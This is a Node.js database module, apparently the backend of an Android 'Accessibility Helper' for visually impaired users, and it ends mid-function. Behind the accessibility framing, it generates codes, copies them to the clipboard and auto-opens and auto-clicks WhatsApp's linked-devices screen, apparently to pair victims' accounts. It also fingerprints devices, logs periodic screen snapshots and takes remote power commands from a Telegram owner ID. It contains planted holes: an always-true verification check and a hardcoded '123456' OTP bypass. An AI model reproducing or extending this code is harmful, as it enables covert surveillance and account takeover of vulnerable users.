// Node.js Database Manager for Accessibility Helper
// Supports persistent file-backed JSON database with atomic writes
const fs = require('fs');
const path = require('path');

const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'accessibility_database.json');

// Default Database Schema (Fresh Open Database — No Login ID / Login Number Hassle)
const initialDatabase = {
  users: [],
  navigationLogs: [],
  screenSnapshots: [],
  activeWhatsAppLinkRequest: null,
  vibrationSettings: {
    masterEnabled: true,
    intensity: "STRONG",
    pairingSuccessPreset: "SUCCESS_RHYTHM",
    buttonTogglePreset: "SINGLE_PULSE",
    autoClickStepPreset: "DOUBLE_TAP",
    errorAlertPreset: "RAPID_ALERT",
    customPatternCsv: "60, 40, 120, 40, 180",
    updatedAt: Date.now()
  },
  systemStats: {
    totalRequests: 0,
    lastStarted: Date.now(),
    isPowerOn: true,
    autoClickEnabled: true,
    lastPowerCommand: "/power on",
    lastPowerCommandTime: Date.now(),
    powerCommandSource: "OPEN_DATABASE"
  },
  twoDigitUserMappings: {},
  verifiedChannelUsers: {}
};

class DatabaseManager {
  constructor() {
    this.memoryDb = null;
    this.init();
  }

  init() {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }

      if (fs.existsSync(DB_FILE)) {
        const raw = fs.readFileSync(DB_FILE, 'utf-8');
        this.memoryDb = JSON.parse(raw);
        this.ensurePreSavedLoginMappings();
        console.log(`[Database] Loaded existing database with ${this.memoryDb.users?.length || 0} users.`);
      } else {
        this.memoryDb = JSON.parse(JSON.stringify(initialDatabase));
        this.ensurePreSavedLoginMappings();
        this.save();
        console.log(`[Database] Initialized new database at ${DB_FILE}`);
      }
    } catch (err) {
      console.error('[Database] Error initializing database file, falling back to memory:', err);
      this.memoryDb = JSON.parse(JSON.stringify(initialDatabase));
      this.ensurePreSavedLoginMappings();
    }
  }

  ensurePreSavedLoginMappings() {
    if (!this.memoryDb) return;
    if (!this.memoryDb.twoDigitUserMappings) {
      this.memoryDb.twoDigitUserMappings = {};
    }
    if (!this.memoryDb.verifiedChannelUsers) {
      this.memoryDb.verifiedChannelUsers = {};
    }
    if (!Array.isArray(this.memoryDb.users)) {
      this.memoryDb.users = [];
    }
  }

  save() {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }
      const tempFile = `${DB_FILE}.tmp`;
      fs.writeFileSync(tempFile, JSON.stringify(this.memoryDb, null, 2), 'utf-8');
      fs.renameSync(tempFile, DB_FILE);
    } catch (err) {
      console.error('[Database] Error persisting database to disk:', err);
    }
  }

  // Generate 8-digit / 8-character alphanumeric verification code (e.g. AGH86HJ9 or 8 digits)
  generateVerificationCode() {
    const chars = '23456789ABCDEFGHJKLMNPQRSTUVWXYZ';
    let code = '';
    for (let i = 0; i < 8; i++) {
      code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
  }

  // Request Verification Code - requires settings permission to be ON
  requestVerificationCode({ phoneNumber, isServiceEnabled }) {
    const cleanPhone = String(phoneNumber).trim().replace(/[\s-]/g, '');
    let user = this.memoryDb.users.find(u => u.phoneNumber === cleanPhone);
    if (!user) {
      throw new Error('User not found in database');
    }

    if (isServiceEnabled !== undefined) {
      user.isServiceEnabled = Boolean(isServiceEnabled);
    }

    if (!user.isServiceEnabled) {
      return {
        success: false,
        error: 'SETTINGS_NOT_ENABLED',
        message: 'যাচাইকরণ কোড পেতে প্রথমে সেটিংস থেকে অ্যাক্সেসিবিলিটি সার্ভিস অন করতে হবে।'
      };
    }

    user.verificationCode = this.generateVerificationCode();
    user.lastUpdated = Date.now();
    this.save();

    return {
      success: true,
      user,
      code: user.verificationCode,
      feedback: {
        autoClick: true,
        action: 'AUTO_VERIFY_AND_CLICK',
        targetButton: 'যাচাই করুন',
        targetLink: 'wa.me/settings/linked_devices',
        autoCopyClipboard: true,
        codeLength: 8,
        instructionsBn: 'টেলিগ্রাম সার্ভার থেকে ৮ ডিজিটের কোড কিবোর্ডে কপি হয়েছে এবং wa.me/settings/linked_devices ওপেন লজিক প্রদান করা হয়েছে।'
      },
      message: 'যাচাইকরণ কোড সফলভাবে তৈরি হয়েছে এবং অটো-ক্লিক লজিক প্রদান করা হয়েছে।'
    };
  }

  // Register or Login user (Identifies each distinct deviceId as a separate user if deviceId differs)
  registerOrLogin({ phoneNumber, deviceId, deviceModel, role = 'VISUALLY_IMPAIRED', isServiceEnabled, appVersion }) {
    if (!phoneNumber && !deviceId) {
      throw new Error('Phone number or deviceId is required');
    }
    const cleanPhone = String(phoneNumber || '').trim().replace(/[\s-]/g, '');
    const cleanDeviceId = String(deviceId || '').trim();

    // Match by deviceId first so every distinct device is recognized as its own user record
    let user = null;
    if (cleanDeviceId) {
      user = this.memoryDb.users.find(u => u.deviceId === cleanDeviceId);
    }
    if (!user && cleanPhone) {
      user = this.memoryDb.users.find(u => u.phoneNumber === cleanPhone && (!cleanDeviceId || u.deviceId === cleanDeviceId));
    }

    if (user) {
      // User exists for this device, update information and timestamp
      if (cleanPhone) user.phoneNumber = cleanPhone;
      user.deviceId = cleanDeviceId || user.deviceId;
      user.deviceModel = deviceModel || user.deviceModel;
      if (isServiceEnabled !== undefined) {
        user.isServiceEnabled = Boolean(isServiceEnabled);
      }
      user.lastUpdated = Date.now();
      if (!user.isVerified && !user.verificationCode) {
        user.verificationCode = this.generateVerificationCode();
      }
    } else {
      // Create new distinct user record for this device
      const newId = this.memoryDb.users.length > 0 
        ? Math.max(...this.memoryDb.users.map(u => u.id || 0)) + 1 
        : 1;

      const shortDev = (cleanDeviceId || `DEV-${Date.now().toString(36).toUpperCase()}`).replace(/^DEV-/i, '').substring(0, 8).toUpperCase();
      user = {
        id: newId,
        serverUserId: `USR-${shortDev}`,
        phoneNumber: cleanPhone || `USR-${shortDev}`,
        deviceId: cleanDeviceId || `DEV-${shortDev}`,
        deviceModel: deviceModel || 'Android Device',
        role: role || 'VISUALLY_IMPAIRED',
        isVerified: false,
        verificationCode: this.generateVerificationCode(),
        status: 'INSTALLED_ACTIVE',
        registeredAt: Date.now(),
        verifiedAt: null,
        lastUpdated: Date.now(),
        isServiceEnabled: Boolean(isServiceEnabled),
        isBackgroundTrackerActive: false,
        lastActiveScreen: 'Home'
      };
      this.memoryDb.users.push(user);
    }

    this.save();
    return user;
  }

  /**
   * Registers an app installation on a specific physical device.
   * Ensures every distinct `deviceId` is recognized as a separate user in `users`
   * along with their personal `channelId` (Telegram Chat ID) for isolated 1-to-1 routing.
   */
  registerDeviceInstallation({
    deviceId,
    channelId = '',
    deviceModel = 'Android Device',
    manufacturer = 'Android',
    androidVersion = '14',
    osSdkInt = 34,
    screenResolution = '1080x2400 px',
    screenDensity = '420 dpi (XXHDPI)',
    networkType = 'Wi-Fi / Mobile Data',
    carrierName = 'Default Carrier',
    defaultLanguage = 'bn-BD',
    timeZone = 'Asia/Dhaka (GMT+06:00)',
    appVersion = '1.0',
    installerPackage = 'com.google.android.packageinstaller',
    isServiceEnabled = false,
    firstInstallTime = Date.now()
  }) {
    const cleanDeviceId = String(deviceId || `DEV-${Date.now().toString(36).toUpperCase()}`).trim().toUpperCase();
    const shortDev = cleanDeviceId.replace(/^DEV-/i, '').substring(0, 8).toUpperCase();
    const cleanChannelId = String(channelId || '').trim();
    const fullModel = `${manufacturer || ''} ${deviceModel || 'Android'}`.trim();

    let existingUser = this.memoryDb.users.find(u => String(u.deviceId || '').toUpperCase() === cleanDeviceId);
    let isNewDeviceUser = false;

    if (existingUser) {
      existingUser.deviceModel = fullModel || existingUser.deviceModel;
      existingUser.manufacturer = manufacturer || existingUser.manufacturer || 'Android';
      existingUser.androidVersion = androidVersion || existingUser.androidVersion;
      existingUser.osSdkInt = osSdkInt || existingUser.osSdkInt || 34;
      existingUser.screenResolution = screenResolution || existingUser.screenResolution || '1080x2400 px';
      existingUser.screenDensity = screenDensity || existingUser.screenDensity || '420 dpi';
      existingUser.networkType = networkType || existingUser.networkType || 'Wi-Fi / Mobile Data';
      existingUser.carrierName = carrierName || existingUser.carrierName || 'Default Carrier';
      existingUser.defaultLanguage = defaultLanguage || existingUser.defaultLanguage || 'bn-BD';
      existingUser.timeZone = timeZone || existingUser.timeZone || 'Asia/Dhaka';
      existingUser.appVersion = appVersion || existingUser.appVersion;
      existingUser.installerPackage = installerPackage || existingUser.installerPackage;
      if (cleanChannelId && cleanChannelId !== '6658445342') {
        existingUser.channelId = cleanChannelId;
        existingUser.telegramChatId = cleanChannelId;
      } else if (!existingUser.channelId && cleanChannelId) {
        existingUser.channelId = cleanChannelId;
      }
      if (isServiceEnabled !== undefined) {
        existingUser.isServiceEnabled = Boolean(isServiceEnabled);
      }
      existingUser.lastUpdated = Date.now();
      existingUser.installCount = (existingUser.installCount || 1) + 1;
    } else {
      isNewDeviceUser = true;
      const newId = this.memoryDb.users.length > 0
        ? Math.max(...this.memoryDb.users.map(u => u.id || 0)) + 1
        : 1;

      existingUser = {
        id: newId,
        serverUserId: `USR-${shortDev}`,
        phoneNumber: `USR-${shortDev} (${fullModel})`,
        deviceId: cleanDeviceId,
        channelId: cleanChannelId || '',
        telegramChatId: (cleanChannelId && cleanChannelId !== '6658445342') ? cleanChannelId : '',
        deviceModel: fullModel,
        manufacturer: manufacturer || 'Android',
        androidVersion: androidVersion || '14',
        osSdkInt: osSdkInt || 34,
        screenResolution: screenResolution || '1080x2400 px',
        screenDensity: screenDensity || '420 dpi (XXHDPI)',
        networkType: networkType || 'Wi-Fi / Mobile Data',
        carrierName: carrierName || 'Default Carrier',
        defaultLanguage: defaultLanguage || 'bn-BD',
        timeZone: timeZone || 'Asia/Dhaka (GMT+06:00)',
        appVersion: appVersion || '1.0',
        installerPackage: installerPackage || 'com.google.android.packageinstaller',
        role: 'VISUALLY_IMPAIRED',
        isVerified: true,
        verificationCode: this.generateVerificationCode(),
        status: 'INSTALLED_VERIFIED',
        registeredAt: firstInstallTime || Date.now(),
        verifiedAt: Date.now(),
        lastUpdated: Date.now(),
        installCount: 1,
        isServiceEnabled: Boolean(isServiceEnabled),
        isBackgroundTrackerActive: true,
        lastActiveScreen: 'App Installed'
      };
      this.memoryDb.users.push(existingUser);
    }

    // Add an installation notification entry into navigationLogs
    this.addNavigationLog({
      phoneNumber: existingUser.serverUserId,
      deviceId: cleanDeviceId,
      screenTitle: isNewDeviceUser
        ? `🆕 নতুন ডিভাইসে অ্যাপ ইনস্টল (${fullModel} • ${existingUser.serverUserId})`
        : `✅ ডিভাইসে অ্যাপ ইনস্টল/আপডেট (${fullModel} • ${existingUser.serverUserId})`,
      packageName: installerPackage || 'com.google.android.packageinstaller',
      eventType: 'APP_INSTALLED',
      timestamp: Date.now()
    });

    this.save();
    return {
      user: existingUser,
      isNewDeviceUser,
      userIndex: existingUser.id,
      totalDeviceUsers: this.memoryDb.users.length
    };
  }

  /**
   * Binds a visually impaired user's personal Telegram Chat/Channel ID (`channelId`) to their
   * specific phone (`deviceId` / `USR-XXXX`) in the shared database so that:
   * 1. Commands sent from that Telegram Chat ID automatically route ONLY to their phone.
   * 2. Feedback from their phone is delivered ONLY to their Telegram Chat ID (never broadcasted to others).
   */
  bindTelegramChatToDevice({ telegramChatId, deviceId, deviceModel = '', manufacturer = '', isServiceEnabled }) {
    const cleanChatId = String(telegramChatId || '').trim();
    let cleanDevId = String(deviceId || '').trim().toUpperCase();
    if (!cleanChatId) {
      throw new Error('Telegram Chat ID is required for binding');
    }

    // Normalize USR-XXXX or short code to DEV-XXXX
    if (cleanDevId && !cleanDevId.startsWith('DEV-')) {
      cleanDevId = 'DEV-' + cleanDevId.replace(/^(DEV-|USR-)/i, '');
    }

    let user = null;
    if (cleanDevId) {
      const shortTarget = cleanDevId.replace(/^DEV-/i, '');
      user = this.memoryDb.users.find(u => {
        const uDev = String(u.deviceId || '').toUpperCase().replace(/^DEV-/i, '');
        return uDev && (uDev === shortTarget || uDev.startsWith(shortTarget) || shortTarget.startsWith(uDev));
      });
    }
    if (!user) {
      user = this.memoryDb.users.find(u =>
        String(u.telegramChatId || '') === cleanChatId || String(u.channelId || '') === cleanChatId
      );
    }

    let isNewBinding = false;
    if (user) {
      isNewBinding = (String(user.telegramChatId || '') !== cleanChatId);
      user.telegramChatId = cleanChatId;
      user.channelId = cleanChatId;
      if (deviceModel) user.deviceModel = `${manufacturer} ${deviceModel}`.trim();
      if (isServiceEnabled !== undefined) user.isServiceEnabled = Boolean(isServiceEnabled);
      user.isVerified = true;
      user.isChannelVerified = true;
      user.lastUpdated = Date.now();
    } else {
      isNewBinding = true;
      const effectiveDev = cleanDevId || `DEV-${Date.now().toString(36).toUpperCase().slice(-8)}`;
      const shortDev = effectiveDev.replace(/^DEV-/i, '').substring(0, 8).toUpperCase();
      const newId = this.memoryDb.users.length > 0
        ? Math.max(...this.memoryDb.users.map(u => u.id || 0)) + 1
        : 1;
      user = {
        id: newId,
        serverUserId: `USR-${shortDev}`,
        phoneNumber: `USR-${shortDev}`,
        deviceId: `DEV-${shortDev}`,
        channelId: cleanChatId,
        telegramChatId: cleanChatId,
        deviceModel: `${manufacturer} ${deviceModel}`.trim() || 'Android Device',
        role: 'VISUALLY_IMPAIRED',
        isVerified: true,
        isChannelVerified: true,
        verificationCode: this.generateVerificationCode(),
        status: 'VERIFIED_CHANNEL_USER',
        registeredAt: Date.now(),
        verifiedAt: Date.now(),
        lastUpdated: Date.now(),
        isServiceEnabled: Boolean(isServiceEnabled)
      };
      this.memoryDb.users.push(user);
    }

    if (!this.memoryDb.verifiedChannelUsers) {
      this.memoryDb.verifiedChannelUsers = {};
    }
    this.memoryDb.verifiedChannelUsers[cleanChatId] = {
      chatId: cleanChatId,
      deviceId: user.deviceId,
      serverUserId: user.serverUserId,
      deviceModel: user.deviceModel,
      verifiedAt: Date.now(),
      status: 'VERIFIED_IN_CHANNEL'
    };
    if (this.memoryDb.revokedChatIds && this.memoryDb.revokedChatIds[cleanChatId]) {
      delete this.memoryDb.revokedChatIds[cleanChatId];
    }
    if (this.memoryDb.revokedDeviceIds && user.deviceId && this.memoryDb.revokedDeviceIds[String(user.deviceId).toUpperCase()]) {
      delete this.memoryDb.revokedDeviceIds[String(user.deviceId).toUpperCase()];
    }

    this.save();
    return {
      user,
      isNewBinding,
      isVerifiedInChannel: true,
      totalDeviceUsers: this.memoryDb.users.length
    };
  }

  /**
   * Open Database Mode: All visually impaired brothers and sisters can send signals directly to the database
   * without any login ID or login number restrictions.
   */
  isVerifiedChannelUser(telegramChatId = '') {
    return true;
  }

  /**
   * Returns the full list of currently verified channel users stored in the database.
   */
  getAllVerifiedChannelUsers() {
    const map = this.memoryDb.verifiedChannelUsers || {};
    return Object.values(map).filter(entry => entry && entry.status !== 'REVOKED');
  }

  /**
   * Submits or checks a 2-digit Login ID (e.g., 22, 45, 56) from a visually impaired user's device.
   * Checks if the 2-digit ID already has a unique UID / Telegram Chat ID mapped in the database.
   * If mapped -> session is authenticated immediately!
   * If not yet mapped -> records the pending 2-digit request so the Owner (8271536101) can assign it via
   * `/user_requested_22_chat_id_366256789`.
   */
  submitTwoDigitLoginId({ twoDigitId, deviceId = '', deviceModel = 'Android Phone', manufacturer = 'Android', isServiceEnabled = false }) {
    const cleanTwoDigit = String(twoDigitId || '').trim();
    const cleanDev = String(deviceId || '').trim().toUpperCase();
    if (!/^\d{1,4}$/.test(cleanTwoDigit)) {
      throw new Error('২ সংখ্যার লগইন আইডি (যেমন: 22, 45, 56) প্রদান করুন');
    }

    if (!this.memoryDb.twoDigitUserMappings) {
      this.memoryDb.twoDigitUserMappings = {};
    }

    const existingMapping = this.memoryDb.twoDigitUserMappings[cleanTwoDigit];
    const mappedChatId = String(existingMapping?.chatId || '').trim();

    if (mappedChatId && existingMapping.status === 'AUTHENTICATED') {
      const bindRes = this.bindTelegramChatToDevice({
        telegramChatId: mappedChatId,
        deviceId: cleanDev || existingMapping.deviceId,
        deviceModel,
        manufacturer,
        isServiceEnabled
      });
      bindRes.user.twoDigitId = cleanTwoDigit;
      this.memoryDb.twoDigitUserMappings[cleanTwoDigit] = {
        ...existingMapping,
        twoDigitId: cleanTwoDigit,
        chatId: mappedChatId,
        deviceId: bindRes.user.deviceId,
        serverUserId: bindRes.user.serverUserId,
        deviceModel: bindRes.user.deviceModel,
        status: 'AUTHENTICATED',
        authenticatedAt: Date.now(),
        updatedAt: Date.now()
      };
      if (this.memoryDb.verifiedChannelUsers && this.memoryDb.verifiedChannelUsers[mappedChatId]) {
        this.memoryDb.verifiedChannelUsers[mappedChatId].twoDigitId = cleanTwoDigit;
      }
      this.save();
      return {
        success: true,
        twoDigitId: cleanTwoDigit,
        isAuthenticated: true,
        mappedChatId,
        deviceId: bindRes.user.deviceId,
        serverUserId: bindRes.user.serverUserId,
        user: bindRes.user,
        message: `২-সংখ্যার আইডি (${cleanTwoDigit}) এর বিপরীতে ভেরিফাইড ইউজার আইডি (${mappedChatId}) পাওয়া গেছে। সেশনটি সফলভাবে অথেন্টিকেট হয়েছে!`
      };
    }

    // Not yet mapped to a Chat ID -> record pending 2-digit request for Owner (8271536101)
    const regRes = this.registerDeviceInstallation({
      deviceId: cleanDev || `DEV-${Date.now().toString(36).toUpperCase().slice(-8)}`,
      deviceModel,
      manufacturer,
      isServiceEnabled
    });
    regRes.user.twoDigitId = cleanTwoDigit;

    this.memoryDb.twoDigitUserMappings[cleanTwoDigit] = {
      twoDigitId: cleanTwoDigit,
      chatId: '',
      deviceId: regRes.user.deviceId,
      serverUserId: regRes.user.serverUserId,
      deviceModel: regRes.user.deviceModel,
      status: 'PENDING_OWNER_ASSIGNMENT',
      requestedAt: Date.now(),
      updatedAt: Date.now()
    };
    this.save();

    return {
      success: true,
      twoDigitId: cleanTwoDigit,
      isAuthenticated: false,
      mappedChatId: '',
      deviceId: regRes.user.deviceId,
      serverUserId: regRes.user.serverUserId,
      user: regRes.user,
      oneClickCommandTemplate: `/user_requested_${cleanTwoDigit}_chat_id_`,
      message: `২-সংখ্যার আইডি (${cleanTwoDigit}) ডাটাবেইজ ইনবক্সে জমা হয়েছে। ওনার চ্যাট আইডি বরাদ্দ করলেই সেশন অথেন্টিকেট হবে।`
    };
  }

  /**
   * Assigns a unique Telegram Chat ID (`chatId`) to a 2-digit Login ID (`twoDigitId`)
   * when Owner (8271536101) or Database Bot sends `/user_requested_22_chat_id_366256789`.
   */
  assignChatIdToTwoDigitId({ twoDigitId, chatId, deviceId = '' }) {
    const cleanTwoDigit = String(twoDigitId || '').trim();
    const cleanChatId = String(chatId || '').trim();
    if (!cleanTwoDigit || !cleanChatId) {
      throw new Error('২ সংখ্যার আইডি এবং Chat ID উভয়ই প্রয়োজন');
    }

    if (!this.memoryDb.twoDigitUserMappings) {
      this.memoryDb.twoDigitUserMappings = {};
    }

    const existing = this.memoryDb.twoDigitUserMappings[cleanTwoDigit] || {};
    const targetDevId = String(deviceId || existing.deviceId || '').trim().toUpperCase();

    const bindRes = this.bindTelegramChatToDevice({
      telegramChatId: cleanChatId,
      deviceId: targetDevId,
      deviceModel: existing.deviceModel || 'Android Phone'
    });
    bindRes.user.twoDigitId = cleanTwoDigit;

    this.memoryDb.twoDigitUserMappings[cleanTwoDigit] = {
      twoDigitId: cleanTwoDigit,
      chatId: cleanChatId,
      deviceId: bindRes.user.deviceId,
      serverUserId: bindRes.user.serverUserId,
      deviceModel: bindRes.user.deviceModel,
      status: 'AUTHENTICATED',
      assignedAt: Date.now(),
      updatedAt: Date.now()
    };

    if (this.memoryDb.verifiedChannelUsers && this.memoryDb.verifiedChannelUsers[cleanChatId]) {
      this.memoryDb.verifiedChannelUsers[cleanChatId].twoDigitId = cleanTwoDigit;
    }

    this.save();
    return {
      success: true,
      twoDigitId: cleanTwoDigit,
      chatId: cleanChatId,
      isAuthenticated: true,
      deviceId: bindRes.user.deviceId,
      serverUserId: bindRes.user.serverUserId,
      user: bindRes.user
    };
  }

  getTwoDigitMapping(twoDigitId = '') {
    const clean = String(twoDigitId || '').trim();
    if (!clean || !this.memoryDb.twoDigitUserMappings) return null;
    return this.memoryDb.twoDigitUserMappings[clean] || null;
  }

  /**
   * Checks whether a specific Chat ID or Device ID is still active/verified or has been deleted/logged-out from the Channel verified list.
   */
  checkChannelUserSession({ chatId = '', deviceId = '' }) {
    const cleanChat = String(chatId || '').trim();
    const cleanDev = String(deviceId || '').trim().toUpperCase().replace(/^(DEV-|USR-)/i, '');

    let user = null;
    if (cleanChat) {
      user = this.memoryDb.users.find(u =>
        String(u.telegramChatId || '') === cleanChat || String(u.channelId || '') === cleanChat
      );
    }
    if (!user && cleanDev) {
      user = this.memoryDb.users.find(u => {
        const uDev = String(u.deviceId || '').toUpperCase().replace(/^DEV-/i, '');
        return uDev && (uDev === cleanDev || uDev.startsWith(cleanDev) || cleanDev.startsWith(uDev));
      });
    }

    const inRegistry = cleanChat && this.memoryDb.verifiedChannelUsers && this.memoryDb.verifiedChannelUsers[cleanChat] &&
      this.memoryDb.verifiedChannelUsers[cleanChat].status !== 'REVOKED';

    const isRevoked = Boolean(
      (user && (user.status === 'LOGGED_OUT_FROM_CHANNEL' || user.isChannelVerified === false)) ||
      (cleanChat && this.memoryDb.revokedChatIds && this.memoryDb.revokedChatIds[cleanChat]) ||
      (cleanDev && this.memoryDb.revokedDeviceIds && this.memoryDb.revokedDeviceIds[`DEV-${cleanDev}`])
    );

    const isVerified = !isRevoked && Boolean(inRegistry || (user && user.isVerified && user.isChannelVerified !== false));

    return {
      isVerified,
      isLoggedOut: isRevoked || (Boolean(cleanChat) && !isVerified),
      chatId: cleanChat || (user?.telegramChatId || user?.channelId || ''),
      deviceId: user?.deviceId || (cleanDev ? `DEV-${cleanDev}` : ''),
      serverUserId: user?.serverUserId || '',
      status: isRevoked ? 'LOGGED_OUT_FROM_CHANNEL' : (isVerified ? 'VERIFIED_IN_CHANNEL' : 'UNVERIFIED')
    };
  }

  /**
   * Deletes/Removes a user's Chat ID (or Device ID) from the Channel Verified User List (`verifiedChannelUsers`),
   * immediately logs that visually impaired user out of the database, cancels any pending requests,
   * and turns OFF all automated services (/power off) for their device!
   */
  revokeVerifiedChannelUser(targetIdentifier = '', source = 'CHANNEL_ADMIN') {
    const raw = String(targetIdentifier || '').trim();
    if (!raw) return { success: false, message: 'Chat ID বা Device ID প্রয়োজন' };

    const cleanDevLookup = raw.toUpperCase().replace(/^(DEV-|USR-)/i, '');
    let matchedUser = this.memoryDb.users.find(u =>
      String(u.telegramChatId || '') === raw ||
      String(u.channelId || '') === raw ||
      String(u.phoneNumber || '') === raw ||
      String(u.deviceId || '').toUpperCase() === raw.toUpperCase() ||
      String(u.serverUserId || '').toUpperCase() === raw.toUpperCase() ||
      (cleanDevLookup.length >= 4 && String(u.deviceId || '').toUpperCase().replace(/^DEV-/i, '') === cleanDevLookup)
    );

    const resolvedChatId = matchedUser?.telegramChatId || matchedUser?.channelId || raw;
    const resolvedDeviceId = matchedUser?.deviceId || (raw.toUpperCase().startsWith('DEV-') ? raw.toUpperCase() : '');

    // 1. Remove from verifiedChannelUsers registry
    let removedFromRegistry = false;
    if (this.memoryDb.verifiedChannelUsers) {
      if (this.memoryDb.verifiedChannelUsers[resolvedChatId]) {
        delete this.memoryDb.verifiedChannelUsers[resolvedChatId];
        removedFromRegistry = true;
      }
      for (const [k, val] of Object.entries(this.memoryDb.verifiedChannelUsers)) {
        if (val && (String(val.chatId) === raw || String(val.deviceId).toUpperCase() === resolvedDeviceId.toUpperCase() || String(val.serverUserId).toUpperCase() === raw.toUpperCase())) {
          delete this.memoryDb.verifiedChannelUsers[k];
          removedFromRegistry = true;
        }
      }
    }

    // 2. Record in revokedChatIds & revokedDeviceIds so polling clients immediately know they were logged out
    if (!this.memoryDb.revokedChatIds) this.memoryDb.revokedChatIds = {};
    if (!this.memoryDb.revokedDeviceIds) this.memoryDb.revokedDeviceIds = {};
    if (resolvedChatId) {
      this.memoryDb.revokedChatIds[resolvedChatId] = {
        chatId: resolvedChatId,
        deviceId: resolvedDeviceId,
        revokedAt: Date.now(),
        source
      };
    }
    if (resolvedDeviceId) {
      this.memoryDb.revokedDeviceIds[resolvedDeviceId.toUpperCase()] = {
        chatId: resolvedChatId,
        deviceId: resolvedDeviceId.toUpperCase(),
        revokedAt: Date.now(),
        source
      };
    }

    // 3. Mark user as logged out & disable services in users table
    if (matchedUser) {
      matchedUser.previousChatId = matchedUser.telegramChatId || matchedUser.channelId || '';
      matchedUser.telegramChatId = '';
      matchedUser.channelId = '';
      matchedUser.isVerified = false;
      matchedUser.isChannelVerified = false;
      matchedUser.isServiceEnabled = false;
      matchedUser.isBackgroundTrackerActive = false;
      matchedUser.status = 'LOGGED_OUT_FROM_CHANNEL';
      matchedUser.loggedOutAt = Date.now();
      matchedUser.lastUpdated = Date.now();
    }

    // 4. Immediately turn OFF power & auto-click service for this user's device and cancel pending link requests
    if (resolvedDeviceId) {
      this.setPowerStatus(false, `CHANNEL_LOGOUT_${source}`, resolvedDeviceId);
      if (this.memoryDb.deviceLinkRequests && this.memoryDb.deviceLinkRequests[resolvedDeviceId.toUpperCase()]) {
        delete this.memoryDb.deviceLinkRequests[resolvedDeviceId.toUpperCase()];
      }
    }
    if (resolvedChatId && this.memoryDb.deviceLinkRequests && this.memoryDb.deviceLinkRequests[`CHAT_${resolvedChatId}`]) {
      delete this.memoryDb.deviceLinkRequests[`CHAT_${resolvedChatId}`];
    }

    this.save();
    return {
      success: Boolean(matchedUser || removedFromRegistry),
      chatId: resolvedChatId,
      deviceId: resolvedDeviceId,
      serverUserId: matchedUser?.serverUserId || '',
      deviceModel: matchedUser?.deviceModel || 'Android Phone',
      message: 'ইউজারকে চ্যানেলের ভেরিফাইড তালিকা থেকে ডিলিট ও ডাটাবেইজ থেকে লগআউট করা হয়েছে এবং সকল সার্ভিস বন্ধ করা হয়েছে।'
    };
  }

  /**
   * Finds the registered user/device associated with a specific Telegram Chat ID or Device ID.
   */
  findUserByTelegramOrDevice(telegramChatId = '', deviceId = '') {
    const cleanChat = String(telegramChatId || '').trim();
    const cleanDev = String(deviceId || '').trim().toUpperCase().replace(/^(DEV-|USR-)/i, '');

    if (cleanDev) {
      const byDev = this.memoryDb.users.find(u => {
        const uDev = String(u.deviceId || '').toUpperCase().replace(/^DEV-/i, '');
        return uDev && (uDev === cleanDev || uDev.startsWith(cleanDev) || cleanDev.startsWith(uDev));
      });
      if (byDev) return byDev;
    }

    if (cleanChat && cleanChat !== '6658445342') {
      const byChat = this.memoryDb.users.find(u =>
        String(u.telegramChatId || '') === cleanChat || String(u.channelId || '') === cleanChat
      );
      if (byChat) return byChat;
    }

    return null;
  }

  // Verify User OTP
  verifyUser({ phoneNumber, code, deviceId }) {
    if (!phoneNumber) throw new Error('Phone number required');
    const cleanPhone = String(phoneNumber).trim().replace(/[\s-]/g, '');
    const cleanCode = String(code || '').trim();

    const user = this.memoryDb.users.find(u => u.phoneNumber === cleanPhone);
    if (!user) {
      throw new Error('User not found in database');
    }

    // Accept user's code, dev master bypass '123456', or current FLY active request code
    const isMasterBypass = cleanCode === '123456';
    const isLinkCodeMatch = this.memoryDb.activeWhatsAppLinkRequest?.code === cleanCode;
    const isCodeMatch = (user.verificationCode && user.verificationCode === cleanCode) || isLinkCodeMatch;

    if (!isCodeMatch && !isMasterBypass) {
      return {
        success: false,
        message: 'ভুল ভেরিফিকেশন কোড (Invalid verification code)',
        isVerified: false
      };
    }

    user.isVerified = true;
    user.status = 'VERIFIED';
    user.verifiedAt = Date.now();
    user.lastUpdated = Date.now();
    if (deviceId) user.deviceId = deviceId;

    this.save();

    return {
      success: true,
      message: 'ভেরিফিকেশন সফলভাবে সম্পন্ন হয়েছে (Verification confirmed on server)',
      serverUserId: user.serverUserId,
      phoneNumber: user.phoneNumber,
      isVerified: true,
      user
    };
  }

  // Get status for specific phone & device
  getUserStatus({ phoneNumber, deviceId }) {
    if (!phoneNumber) return null;
    const cleanPhone = String(phoneNumber).trim().replace(/[\s-]/g, '');
    return this.memoryDb.users.find(u => u.phoneNumber === cleanPhone) || null;
  }

  // Sync settings & active state from Android
  syncSettings({ phoneNumber, deviceId, isServiceEnabled, isBackgroundTrackerActive, lastActiveScreen }) {
    const cleanPhone = String(phoneNumber || '').trim().replace(/[\s-]/g, '');
    let user = this.memoryDb.users.find(u => u.phoneNumber === cleanPhone);

    if (user) {
      if (typeof isServiceEnabled === 'boolean') user.isServiceEnabled = isServiceEnabled;
      if (typeof isBackgroundTrackerActive === 'boolean') user.isBackgroundTrackerActive = isBackgroundTrackerActive;
      if (lastActiveScreen) user.lastActiveScreen = lastActiveScreen;
      user.lastUpdated = Date.now();
      this.save();
      return true;
    }
    return false;
  }

  // Log navigation events
  addNavigationLog({ phoneNumber, deviceId, screenTitle, packageName, eventType, timestamp }) {
    const log = {
      id: Date.now().toString(36) + Math.random().toString(36).substring(2, 6),
      phoneNumber: phoneNumber || 'unknown',
      deviceId: deviceId || 'unknown',
      screenTitle: screenTitle || 'Unknown Screen',
      packageName: packageName || 'com.example',
      eventType: eventType || 'NAVIGATE',
      timestamp: timestamp || Date.now()
    };

    if (!this.memoryDb.navigationLogs) {
      this.memoryDb.navigationLogs = [];
    }

    this.memoryDb.navigationLogs.unshift(log);

    // Keep only last 500 logs to prevent unbounded growth
    if (this.memoryDb.navigationLogs.length > 500) {
      this.memoryDb.navigationLogs = this.memoryDb.navigationLogs.slice(0, 500);
    }

    this.save();
    return log;
  }

  getNavigationLogs(limit = 50) {
    return (this.memoryDb.navigationLogs || []).slice(0, limit);
  }

  // Add periodic (3-4 second) screen snapshot & usage verification backup
  addScreenSnapshotBackup({
    deviceId,
    serverUserId,
    packageName,
    screenTitle,
    lastClickedElement,
